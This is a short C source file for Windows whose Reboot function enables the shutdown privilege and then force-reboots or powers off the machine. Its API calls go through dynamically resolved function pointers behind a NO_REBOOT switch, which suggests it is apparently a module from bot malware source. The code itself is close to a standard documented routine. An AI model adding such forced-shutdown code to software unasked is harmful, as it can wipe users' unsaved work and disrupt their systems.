#include "stuff.h"
#include "externals.h"

#ifndef NO_REBOOT

void Reboot(BOOL shutdown)
{
	HANDLE hToken; 
	TOKEN_PRIVILEGES tkp; 
 
	// Get a token for this process. 
 
	if (!fOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
		return;
 
	// Get the LUID for the shutdown privilege. 
 
	fLookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, 
			&tkp.Privileges[0].Luid); 
 
	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
 
	// Get the shutdown privilege for this process. 
 
	fAdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 
 
	// Cannot test the return value of AdjustTokenPrivileges. 
 
	if (fGetLastError() != ERROR_SUCCESS) 
		return;

	if (shutdown)
		fExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED);
	else
		fExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED);
}

#endif